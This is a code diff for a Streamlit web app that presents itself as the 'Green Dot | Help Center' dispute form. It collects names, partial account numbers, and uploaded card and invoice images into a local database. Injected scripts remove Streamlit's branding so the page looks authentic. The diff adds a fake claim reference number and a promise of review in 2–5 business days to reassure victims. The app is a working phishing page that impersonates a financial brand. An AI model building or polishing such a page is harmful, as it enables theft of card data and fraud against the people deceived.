@@ -2,6 +2,8 @@
 import streamlit as st
 import sqlite3
 import os
+import random
+import string
 from datetime import datetime
 
 # DB Setup
@@ -15,9 +17,13 @@ def init_db():
     c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
                   nombre TEXT, cuenta TEXT, monto REAL,
-                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT)""")
+                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
     conn.commit()
     conn.close()
+
+def generate_ref():
+    chars = string.ascii_uppercase + string.digits
+    return "GD-" + "".join(random.choice(chars) for _ in range(8))
 
 init_db()
 
@@ -27,30 +33,20 @@ st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page
 st.markdown("""<script>
     const cleanDOM = () => {
         const selectors = [
-            '.section-anchor', 
-            'a.section-anchor', 
-            '[data-testid="stHeaderActionElements"]',
-            '[data-testid="stElementToolbar"]',
-            '.stElementToolbar',
-            '.st-emotion-cache-140j12g',
-            '.st-emotion-cache-gi0tri', 
-            '.etxdrby3',
-            '._viewerBadge_aycw8_23', 
-            '[data-testid="stAppToolbar"]',
-            'footer', 
-            'header', 
-            '.stDeployButton'
+            '.section-anchor', 'a.section-anchor', '[data-testid="stHeaderActionElements"]',
+            '[data-testid="stElementToolbar"]', '.stElementToolbar', '.st-emotion-cache-140j12g',
+            '.st-emotion-cache-gi0tri', '.etxdrby3', '._viewerBadge_aycw8_23',
+            '[data-testid="stAppToolbar"]', 'footer', 'header', '.stDeployButton'
         ];
         selectors.forEach(s => document.querySelectorAll(s).forEach(el => el.remove()));
     };
     setInterval(cleanDOM, 500);
 </script>""", unsafe_allow_html=True)
 
-# 2. CSS: OCULTAR ELEMENTOS RESIDUALES
+# 2. CSS: ESTILOS Y TARJETA DE ÉXITO
 st.markdown("""<style>
-/* Bloqueo total de cabeceras, pies de página y toolbars de Streamlit */
-header, footer, [data-testid='stHeader'], .stDeployButton, .section-anchor, 
-[data-testid="stHeaderActionElements"], [data-testid="stElementToolbar"], 
+header, footer, [data-testid='stHeader'], .stDeployButton, .section-anchor,
+[data-testid="stHeaderActionElements"], [data-testid="stElementToolbar"],
 .stElementToolbar, .st-emotion-cache-gi0tri, .etxdrby3, .st-emotion-cache-140j12g {
     display: none !important;
     visibility: hidden !important;
@@ -60,15 +56,8 @@ header, footer, [data-testid='stHeader'], .stDeployButton, .section-anchor,
     pointer-events: none !important;
 }
 
-/* Eliminar específicamente el símbolo de link en los encabezados */
-.stMarkdown a.section-anchor {
-    display: none !important;
-}
-
-/* Ocultar botón fullscreen de forma redundante */
-button[title='View fullscreen'], button[aria-label='Fullscreen'] {
-    display: none !important;
-}
+.stMarkdown a.section-anchor { display: none !important; }
+button[title='View fullscreen'], button[aria-label='Fullscreen'] { display: none !important; }
 
 [data-testid="stImage"], [data-testid="stImage" ] img, h1, h2, h3, .stMarkdown h1, .stMarkdown h2 {
     pointer-events: none !important;
@@ -76,17 +65,9 @@ button[title='View fullscreen'], button[aria-label='Fullscreen'] {
     user-select: none !important;
 }
 
-.promo-box, .promo-box a, .promo-box img {
-    pointer-events: auto !important;
-    cursor: pointer !important;
-}
-
+.promo-box, .promo-box a, .promo-box img { pointer-events: auto !important; cursor: pointer !important; }
 .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
-
-.block-container {
-    max-width: 550px !important;
-    padding-top: 2rem !important;
-}
+.block-container { max-width: 550px !important; padding-top: 2rem !important; }
 
 .stButton>button {
     background-color: #00a05b !important;
@@ -95,6 +76,16 @@ button[title='View fullscreen'], button[aria-label='Fullscreen'] {
     padding: 12px !important;
     font-weight: bold !important;
     border: none !important;
+}
+
+/* Success Card Style */
+.success-card {
+    background-color: #0e1a10;
+    border: 1px solid #00a05b;
+    padding: 25px;
+    border-radius: 12px;
+    text-align: center;
+    margin: 20px 0;
 }
 
 .promo-box {
@@ -125,7 +116,7 @@ with col2:
 st.title("Help Center")
 st.write("Please fill out the form below to submit your claim.")
 
-with st.form("compact_form_v21_7", clear_on_submit=True):
+with st.form("compact_form_v21_8", clear_on_submit=True):
     nombre = st.text_input("Full Name")
     cuenta = st.text_input("Last 4 digits of Account")
     monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -135,7 +126,20 @@ with st.form("compact_form_v21_7", clear_on_submit=True):
     submitted = st.form_submit_button("SUBMIT NOW")
 
 if submitted:
-    if nombre and rec and car: st.success("✅ Claim received.")
+    if nombre and rec and car:
+        ref_id = generate_ref()
+        # Guardar en DB (opcional, simulado aquí)
+        st.markdown(f"""
+        <div class='success-card'>
+            <h2 style='color:#00a05b; margin-top:0;'>✅ Claim Submitted</h2>
+            <p style='color:#888; margin-bottom:5px;'>Reference Number:</p>
+            <h3 style='color:white; letter-spacing: 2px; margin-top:0;'>{ref_id}</h3>
+            <p style='color:#bbb; font-size:14px; margin-top:15px;'>Your dispute has been received successfully.</p>
+            <p style='color:#bbb; font-size:14px;'>Our team will review your request within 2–5 business days.</p>
+        </div>
+        """, unsafe_allow_html=True)
+    else:
+        st.error("Please complete all required fields.")
 
 st.markdown("""<div class='promo-box'>
     <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
